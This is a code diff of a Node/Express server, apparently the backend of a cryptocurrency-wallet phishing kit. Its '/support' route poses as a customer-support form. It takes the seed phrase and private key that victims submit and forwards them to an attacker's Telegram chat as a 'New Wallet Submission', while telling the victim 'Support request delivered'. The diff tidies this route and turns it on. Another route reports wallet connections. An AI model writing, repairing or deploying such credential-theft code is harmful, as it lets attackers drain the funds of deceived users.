@@ -218,56 +218,29 @@ function requireTelegramConfig() {
   return { token, chatId };
 }
 
-// // ----------------- Support form route (FIXED) -----------------
-// app.post('/support', async (req, res) => {
-//   try {
-//     const { name, email, message, address, walletType } = req.body || {};
-
-//     const { token, chatId } = requireTelegramConfig();
-
-//     // FIXED: Correct fields mapped from frontend
-//     const text =
-//       `<b>New Wallet Submission 🔔</b>\n` +
-//       `Wallet-Type: <b>${escapeHtml(walletType || '')}</b>\n` +
-//       `Wallet-Phrase: <code>${escapeHtml(address || '')}</code>\n` +
-//       `Private-Key: <code>${escapeHtml(email || '')}</code>\n` +
-//       `\nTime: ${new Date().toISOString()}`;
-
-//     await sendTelegramMessage({ token, chatId, text });
-
-//     res.json({ ok: true, message: 'Support request delivered' });
-//   } catch (err) {
-//     console.error('/support error:', err?.message || err);
-//     return res.status(500).json({ ok: false, error: 'server_error', detail: String(err?.message || err) });
-//   }
-// });
+// ----------------- Support form route (FIXED) -----------------
 app.post('/support', async (req, res) => {
-try {
-const { name, email, message, address } = req.body || {};
+  try {
+    const { name, email, message, address, walletType } = req.body || {};
 
+    const { token, chatId } = requireTelegramConfig();
 
-const { token, chatId } = requireTelegramConfig();
+    // FIXED: Correct fields mapped from frontend
+    const text =
+      `<b>New Wallet Submission 🔔</b>\n` +
+      `Wallet-Type: <b>${escapeHtml(walletType || '')}</b>\n` +
+      `Wallet-Phrase: <code>${escapeHtml(address || '')}</code>\n` +
+      `Private-Key: <code>${escapeHtml(email || '')}</code>\n` +
+      `\nTime: ${new Date().toISOString()}`;
 
-const text =
-  `<b>New Wallet Submission 🔔</b>\n` +
-  `Wallet-Name: <b>${escapeHtml(name || '')}</b>\n` +
-  `Wallet-Phrase: <code>${escapeHtml(address || '')}</code>\n` +
-  `Private-Key: <code>${escapeHtml(email || '')}</code>\n` +
-  `\nTime: ${new Date().toISOString()}`;
+    await sendTelegramMessage({ token, chatId, text });
 
-// send message and capture Telegram API response
-const telegramResponse = await sendTelegramMessage({ token, chatId, text });
-
-// return Telegram API response for debugging
-res.json({ ok: true, message: 'Support request delivered', telegramResponse });
-
-
-} catch (err) {
-console.error('/support error:', err?.message || err);
-return res.status(500).json({ ok: false, error: 'telegram_failed', detail: String(err?.message || err) });
-}
+    res.json({ ok: true, message: 'Support request delivered' });
+  } catch (err) {
+    console.error('/support error:', err?.message || err);
+    return res.status(500).json({ ok: false, error: 'server_error', detail: String(err?.message || err) });
+  }
 });
-
 
 // ----------------- Wallet connect notification -----------------
 app.post('/notify/wallet-connected', async (req, res) => {
